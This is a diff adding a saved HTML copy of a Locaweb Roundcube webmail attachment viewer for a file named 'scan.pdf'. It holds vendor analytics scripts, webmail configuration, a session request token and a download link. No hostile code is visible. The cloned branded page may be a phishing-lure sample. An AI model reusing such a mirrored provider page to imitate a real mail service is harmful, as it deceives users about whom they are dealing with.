@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html class=" js"><head>
+<title>Webmail :: scan.pdf</title>
+<meta http-equiv="X-UA-Compatible" content="IE=EDGE">
+<link rel="shortcut icon" href="https://webmail-seguro.com.br/writesys.com.br/skins/larry_claro/images/favicon.ico">
+<link rel="stylesheet" type="text/css" href="simplified_schematic_files/styles.css">
+<link rel="stylesheet" type="text/css" href="simplified_schematic_files/mail_002.css">
+<!--[if IE 9]><link rel="stylesheet" type="text/css" href="skins/larry_claro/svggradients.css?s=1489433813" /><![endif]-->
+<!--[if lte IE 8]><link rel="stylesheet" type="text/css" href="skins/larry_claro/iehacks.css?s=1489433815" /><![endif]-->
+<!--[if lte IE 7]><link rel="stylesheet" type="text/css" href="skins/larry_claro/ie7hacks.css?s=1489433813" /><![endif]-->
+<link rel="stylesheet" type="text/css" href="simplified_schematic_files/jquery-ui-1.css">
+<link rel="stylesheet" type="text/css" href="simplified_schematic_files/qtip.css">
+<link rel="stylesheet" type="text/css" href="simplified_schematic_files/calicon.css">
+<link rel="stylesheet" type="text/css" href="simplified_schematic_files/sticky_notes.css">
+<link rel="stylesheet" type="text/css" href="simplified_schematic_files/locaweb_search.css">
+<link rel="stylesheet" type="text/css" href="simplified_schematic_files/mail.css">
+<script src="simplified_schematic_files/aece2c08f5" type="text/javascript"></script><script src="simplified_schematic_files/nr-998.js"></script><script src="simplified_schematic_files/ga.js" async="" type="text/javascript"></script><script src="simplified_schematic_files/recaptcha__pt_br.js" async="" type="text/javascript"></script><script type="text/javascript" src="simplified_schematic_files/ui.js"></script>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8"><script type="text/javascript">window.NREUM||(NREUM={}),__nr_require=function(e,t,n){function r(n){if(!t[n]){var o=t[n]={exports:{}};e[n][0].call(o.exports,function(t){var o=e[n][1][t];return r(o||t)},o,o.exports)}return t[n].exports}if("function"==typeof __nr_require)return __nr_require;for(var o=0;o<n.length;o++)r(n[o]);return r}({1:[function(e,t,n){function r(){}function o(e,t,n){return function(){return i(e,[(new Date).getTime()].concat(u(arguments)),t?null:this,n),t?void 0:this}}var i=e("handle"),a=e(2),u=e(3),c=e("ee").get("tracer"),f=NREUM;"undefined"==typeof window.newrelic&&(newrelic=f);var s=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit"],l="api-",p=l+"ixn-";a(s,function(e,t){f[t]=o(l+t,!0,"api")}),f.addPageAction=o(l+"addPageAction",!0),f.setCurrentRouteName=o(l+"routeName",!0),t.exports=newrelic,f.interaction=function(){return(new r).get()};var d=r.prototype={createTracer:function(e,t){var n={},r=this,o="function"==typeof t;return i(p+"tracer",[Date.now(),e,n],r),function(){if(c.emit((o?"":"no-")+"fn-start",[Date.now(),r,o],n),o)try{return t.apply(this,arguments)}finally{c.emit("fn-end",[Date.now()],n)}}}};a("setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(e,t){d[t]=o(p+t)}),newrelic.noticeError=function(e){"string"==typeof e&&(e=new Error(e)),i("err",[e,(new Date).getTime()])}},{}],2:[function(e,t,n){function r(e,t){var n=[],r="",i=0;for(r in e)o.call(e,r)&&(n[i]=t(r,e[r]),i+=1);return n}var o=Object.prototype.hasOwnProperty;t.exports=r},{}],3:[function(e,t,n){function r(e,t,n){t||(t=0),"undefined"==typeof n&&(n=e?e.length:0);for(var r=-1,o=n-t||0,i=Array(o<0?0:o);++r<o;)i[r]=e[t+r];return i}t.exports=r},{}],ee:[function(e,t,n){function r(){}function o(e){function t(e){return e&&e instanceof r?e:e?c(e,u,i):i()}function n(n,r,o){if(!p.aborted){e&&e(n,r,o);for(var i=t(o),a=v(n),u=a.length,c=0;c<u;c++)a[c].apply(i,r);var f=s[w[n]];return f&&f.push([y,n,r,i]),i}}function d(e,t){b[e]=v(e).concat(t)}function v(e){return b[e]||[]}function g(e){return l[e]=l[e]||o(n)}function m(e,t){f(e,function(e,n){t=t||"feature",w[n]=t,t in s||(s[t]=[])})}var b={},w={},y={on:d,emit:n,get:g,listeners:v,context:t,buffer:m,abort:a,aborted:!1};return y}function i(){return new r}function a(){(s.api||s.feature)&&(p.aborted=!0,s=p.backlog={})}var u="nr@context",c=e("gos"),f=e(2),s={},l={},p=t.exports=o();p.backlog=s},{}],gos:[function(e,t,n){function r(e,t,n){if(o.call(e,t))return e[t];var r=n();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(e,t,{value:r,writable:!0,enumerable:!1}),r}catch(i){}return e[t]=r,r}var o=Object.prototype.hasOwnProperty;t.exports=r},{}],handle:[function(e,t,n){function r(e,t,n,r){o.buffer([e],r),o.emit(e,t,n)}var o=e("ee").get("handle");t.exports=r,r.ee=o},{}],id:[function(e,t,n){function r(e){var t=typeof e;return!e||"object"!==t&&"function"!==t?-1:e===window?0:a(e,i,function(){return o++})}var o=1,i="nr@id",a=e("gos");t.exports=r},{}],loader:[function(e,t,n){function r(){if(!h++){var e=y.info=NREUM.info,t=l.getElementsByTagName("script")[0];if(setTimeout(f.abort,3e4),!(e&&e.licenseKey&&e.applicationID&&t))return f.abort();c(b,function(t,n){e[t]||(e[t]=n)}),u("mark",["onload",a()],null,"api");var n=l.createElement("script");n.src="https://"+e.agent,t.parentNode.insertBefore(n,t)}}function o(){"complete"===l.readyState&&i()}function i(){u("mark",["domContent",a()],null,"api")}function a(){return(new Date).getTime()}var u=e("handle"),c=e(2),f=e("ee"),s=window,l=s.document,p="addEventListener",d="attachEvent",v=s.XMLHttpRequest,g=v&&v.prototype;NREUM.o={ST:setTimeout,CT:clearTimeout,XHR:v,REQ:s.Request,EV:s.Event,PR:s.Promise,MO:s.MutationObserver},e(1);var m=""+location,b={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-998.min.js"},w=v&&g&&g[p]&&!/CriOS/.test(navigator.userAgent),y=t.exports={offset:a(),origin:m,features:{},xhrWrappable:w};l[p]?(l[p]("DOMContentLoaded",i,!1),s[p]("load",r,!1)):(l[d]("onreadystatechange",o),s[d]("onload",r)),u("mark",["firstbyte",a()],null,"api");var h=0},{}]},{},["loader"]);</script>
+<script src="simplified_schematic_files/jquery_002.js" type="text/javascript"></script>
+<script src="simplified_schematic_files/common.js" type="text/javascript"></script>
+<script src="simplified_schematic_files/app.js" type="text/javascript"></script>
+<script type="text/javascript">
+
+var rcmail = new rcube_webmail();
+rcmail.set_env({"task":"mail","x_frame_options":"sameorigin","skin":"larry_claro","keep_alive":60,"framed":true,"action":"get","comm_path":".\/?_task=mail&_framed=1","images_path":"skins\/larry_claro","message_banner_text":"Seja bem vindo ao Webmail","message_banner_cookie_name":null,"help_link":"https:\/\/wiki.locaweb.com.br\/pt-br\/Categoria:Webmail","date_format":"dd\/mm\/yy","calskin":"larry_claro","ics_icon":"plugins\/calendar\/skins\/larry_claro\/images\/ics.png","cal_backend":"caldav","request_token":"4a6cfabc812357c7f7418e0c45520c35"});
+rcmail.add_label({"loading":"Carregando...","servererror":"Erro no Servidor!","requesttimedout":"Tempo da requisi\u00e7\u00e3o esgotado","locaweb_tools.others":"Ferramentas","locaweb_tools.undefined":"---","locaweb_tools.userinfo":"Meus dados","locaweb_tools.editinfo":"Editar dados","locaweb_tools.backtomail":"Voltar","locaweb_tools.contact_lists":"Listas de contatos","locaweb_tools.option_select_all_messages":"Permitir sele\u00e7\u00e3o de todas as mensagens da pasta","locaweb_tools.section":"Sess\u00e3o","locaweb_tools.calendar":"Calend\u00e1rio","locaweb_tools.help":"Ajuda","locaweb_tools.clear_trash":"<b>Aten\u00e7\u00e3o:<\/b> a partir do dia 20\/9 as mensagens existentes na pasta Lixeira com data anterior a 30 dias ser\u00e3o apagadas automaticamente. Caso queira mant\u00ea-las, mova-as para outra pasta.","locaweb_tools.webmail_disable":"Ops! Email e senha n\u00e3o combinam ou voc\u00ea n\u00e3o tem acesso ao webmail.","locaweb_tools.import_contacts_locamail":"$count contato(s) foram importados do Locamail com sucesso","locaweb_tools.import_groups_locamail":"$count grupos(s) foram importados do Locamail com sucesso","locaweb_tools.folder_msg_days_do_die":"<b>$folder:<\/b> Mensagens na $folder ser\u00e3o apagadas automaticamente ap\u00f3s $days dias.","locaweb_tools.unexpected_error_getting_contacts":"Erro ao pegar os contatos do dom\u00ednio. Por favor tente novamente em alguns minutos.","managesieve.autoreply":"[managesieve.autoreply]","managesieve.createautoreply":"[managesieve.createautoreply]","managesieve.cannotbeempty":"[managesieve.cannotbeempty]","managesieve.vacationreply":"[managesieve.vacationreply]","editorwarning":"Mudar para o editor de texto simples elimina toda a formata\u00e7\u00e3o de texto. Deseja continuar?","locaweb_blackwhitelist.others":"Ferramentas","locaweb_blackwhitelist.section":"Se\u00e7\u00e3o","locaweb_blackwhitelist.calendar":"Calend\u00e1rios","locaweb_blackwhitelist.blackwhitelist":"Endere\u00e7os liberados e bloqueados","locaweb_blackwhitelist.clear_trash":"<b>Aten\u00e7\u00e3o:<\/b> a partir do dia 20\/9 as mensagens existentes na pasta Lixeira com data anterior a 30 dias ser\u00e3o apagadas automaticamente. Caso queira mant\u00ea-las, mova-as para outra pasta.","locaweb_blackwhitelist.blocked_addresses":"Endere\u00e7os bloqueados","locaweb_blackwhitelist.filter_warning":"As mensagens de remetentes bloqueados s\u00e3o barradas antes de passar pelos filtros.","locaweb_blackwhitelist.add_address":"Incluir endere\u00e7o","locaweb_blackwhitelist.add":"Incluir","locaweb_blackwhitelist.blocked_list":"Lista de bloqueados:","locaweb_blackwhitelist.move_labels":"Mover mensagens bloqueadas para:","locaweb_blackwhitelist.addresses_released":"Endere\u00e7os liberados","locaweb_blackwhitelist.list_released":"Lista de liberados","locaweb_blackwhitelist.email_message":"S\u00e3o aceitos endere\u00e7os(exemplo@exemplo.com) ou dom\u00ednios (@exemplo.com.br)","locaweb_blackwhitelist.save":"Salvar","locaweb_blackwhitelist.success":"Listas atualizadas com sucesso!","locaweb_blackwhitelist.email_invalid":"Formato inv\u00e1lido","locaweb_blackwhitelist.email_empty":"Favor preencher o campo com o endere\u00e7o","locaweb_blackwhitelist.email_delete":"Quer excluir todos os seguintes componentes?","locaweb_blackwhitelist.block_contact":"Bloquear contato","locaweb_blackwhitelist.block_contact_success":"O contato $contact foi bloqueado com sucesso!","locaweb_blackwhitelist.block_contact_exist":"$contact j\u00e1 bloqueado.","locaweb_blackwhitelist.block_contact_error":"Erro ao bloquear contato.","locaweb_blackwhitelist.autoreply_subject_default":"[Auto-Resposta]","locaweb_blackwhitelist.autoreply_body_default":"<p>Digite aqui o texto da auto-resposta e habilite este filtro.<\/p>","locaweb_blackwhitelist.vacationreplay":"* Essa mensagem ser\u00e1 enviada como resposta para todos os emails que chegarem \u00e0 caixa de entrada.","locaweb_blackwhitelist.filterunknownerror":"Erro desconhecido de servidor","locaweb_blackwhitelist.filterconnerror":"N\u00e3o foi poss\u00edvel conectar ao servidor managesieve","locaweb_blackwhitelist.unexpected_error":"Ocorreu um erro inesperado ao tentar salvar as informa\u00e7\u00f5es. Por favor tente novamente em alguns minutos.","addressbook_imap.nickname":"Apelido","addressbook_imap.company":"Empresa","addressbook_imap.email2":"E-Mail 2","addressbook_imap.phone":"Telefone","addressbook_imap.cell_phone":"Celular","addressbook_imap.website":"Website","addressbook_imap.address":"Endere\u00e7o","addressbook_imap.birthday":"Anivers\u00e1rio","addressbook_imap.notes":"Anota\u00e7\u00f5es","addressbook_imap.msn":"MSN","addressbook_imap.personal":"Pessoal","addressbook_imap.import_limit_text":"Limite de contatos por arquivo de importa\u00e7\u00e3o: $import_limit contatos.","addressbook_imap.create_groups":"Criar grupo","addressbook_imap.email_empty":"Email \u00e9 obrigat\u00f3rio","addressbook_imap.successfully_imported":"Contatos importados com sucesso","addressbook_imap.import_limit_contacts_error":"O arquivo a ser importado deve ter menos que $limit contatos","chbox.chbox":"Seletor","chbox.all_messages":"Todas as mensagens","chbox.currpage_messages":"Mensagens da p\u00e1gina","chbox.unread_messages":"Mensagens n\u00e3o lidas","chbox.invert_messages":"Mensagens inversas","chbox.none_messages":"Nenhuma","sticky_notes.pluginname":"Notas r\u00e1pidas","sticky_notes.plugindescription":"Criar e gerenciar notas.","sticky_notes.sticky_notes":"Notas","sticky_notes.add_note":"Adicionar uma nova nota","sticky_notes.edit_note":"Editar uma nota","sticky_notes.note_text":"Texto da nota","sticky_notes.note_summary":"Resumo","sticky_notes.note_color":"Cor","sticky_notes.reassemble_notes":"Remarcar notas","sticky_notes.submit":"Enviar","sticky_notes.move_to_calendar":"Mover para o calend\u00e1rio","sticky_notes.timeOnlyTitle":"Escolha a data","sticky_notes.timeText":"Hora","sticky_notes.hourText":"Hora","sticky_notes.minuteText":"Minuto","sticky_notes.currentText":"Agora","sticky_notes.closeText":"Mover","sticky_notes.timeFormat":"hh:mm tt","sticky_notes.note_text_short":"Por favor, digite um texto","sticky_notes.enter_summary":"Por favor, digite um resumo","sticky_notes.errorsaving":"Um erro ocorreu ao salvar.","sticky_notes.areyousure":"Tem certeza que deseja apagar essa nota?","sticky_notes.default":"padr\u00e3o","locaweb_banner.modal_title":"Seu webmail ainda mais seguro!","locaweb_banner.modal_body":"<p>A partir de agora, ao acessar o endere\u00e7o do seu webmail, voc\u00ea ser\u00e1 direcionado para um endere\u00e7o com um novo certificado de seguran\u00e7a.<\/p><p>Com esta melhoria, voc\u00ea est\u00e1 mais protegido contra a intercepta\u00e7\u00e3o de seus dados por terceiros durante a autentica\u00e7\u00e3o.<\/p>","locaweb_banner.modal_accept":"Entendi","locaweb_banner.modal_more_details":"Mais detales","locaweb_banner.modal_app_banner_title":"Seu E-mail Locaweb pelo celular","locaweb_banner.modal_app_banner_subtitle":"Baixe o TypeMail e gerencie suas mensagens","forgot_password.no_alternative_email_warning":"Cadastre um e-mail alternativo."});
+</script>
+
+<script type="text/javascript" src="simplified_schematic_files/mail.js"></script>
+<script type="text/javascript" src="simplified_schematic_files/remove_links_order.js"></script>
+<script type="text/javascript" src="simplified_schematic_files/help_link.js"></script>
+<script type="text/javascript" src="simplified_schematic_files/default.js"></script>
+<script type="text/javascript" src="simplified_schematic_files/api.js"></script>
+<script type="text/javascript" src="simplified_schematic_files/jquery-ui-1.js"></script>
+<script type="text/javascript" src="simplified_schematic_files/jquery.js"></script>
+<script type="text/javascript" src="simplified_schematic_files/forgot_password.js"></script>
+<script type="text/javascript" src="simplified_schematic_files/blackwhitelist_mail.js"></script>
+<script type="text/javascript" src="simplified_schematic_files/qtip.js"></script>
+<script type="text/javascript" src="simplified_schematic_files/calendar.js"></script>
+<script type="text/javascript" src="simplified_schematic_files/calendar_002.js"></script>
+<script type="text/javascript" src="simplified_schematic_files/timezone.js"></script>
+<script type="text/javascript" src="simplified_schematic_files/detect_timezone.js"></script>
+<script type="text/javascript" src="simplified_schematic_files/date.js"></script>
+<script type="text/javascript" src="simplified_schematic_files/date_002.js"></script>
+<script type="text/javascript" src="simplified_schematic_files/calendar_003.js"></script>
+<script type="text/javascript" src="simplified_schematic_files/move_button.js"></script>
+<script type="text/javascript" src="simplified_schematic_files/move_button_002.js"></script>
+<script type="text/javascript" src="simplified_schematic_files/locaweb_search.js"></script>
+<script type="text/javascript">
+var _gaq = _gaq || [];
+_gaq.push(['_setAccount', 'UA-18977336-11']);
+
+_gaq.push(['_trackPageview']);
+
+(function() {
+var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+})();
+
+</script>
+
+</head>
+<body class="extwin">
+
+<div id="header">
+<div id="topline">
+	<div class="topright">
+		<a href="#close" class="closelink" onclick="self.close()">Fechar</a>
+	</div>
+</div>
+
+<div id="topnav">
+	<img src="simplified_schematic_files/locaweb_logo.png" onerror='this.src="skins/larry_claro/images/locaweb_logo.png";' title="writesys.com.br">
+</div>
+
+<br style="clear:both">
+</div>
+
+<div id="mainscreen">
+
+<div id="partheader" class="uibox">
+<table class="headers-table"><tbody><tr><td class="title">Nome do arquivo</td>
+<td class="header">scan.pdf</td>
+<td class="download-link"><a href="https://webmail-seguro.com.br/writesys.com.br/?_task=mail&amp;_framed=1&amp;_action=get&amp;_mbox=INBOX&amp;_uid=55026&amp;_part=1&amp;_download=1">Baixar</a></td>
+</tr>
+<tr><td class="title">Tamanho</td>
+<td class="header">159 KB</td>
+</tr>
+</tbody>
+</table>
+
+</div>
+
+<div id="messagepartcontainer" class="uibox">
+<iframe name="messagePartFrame" id="messagepartframe" style="width:100%; height:100%" src="./?_task=mail&amp;_framed=1&amp;_action=get&amp;_mbox=INBOX&amp;_uid=55026&amp;_part=1&amp;_preload=1"></iframe>
+</div>
+
+</div>
+
+<script type="text/javascript">
+
+$(document).ready(function(){ 
+rcmail.init();
+});
+</script>
+
+<script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"beacon":"bam.nr-data.net","licenseKey":"aece2c08f5","applicationID":"13410389","transactionName":"ZgMBMkBYDRcCARVQC19JNhRbFgoKBwcZFxRZFg==","queueTime":0,"applicationTime":120,"atts":"SkQCRAhCHhk=","errorBeacon":"bam.nr-data.net","agent":""}</script>
+</body></html>
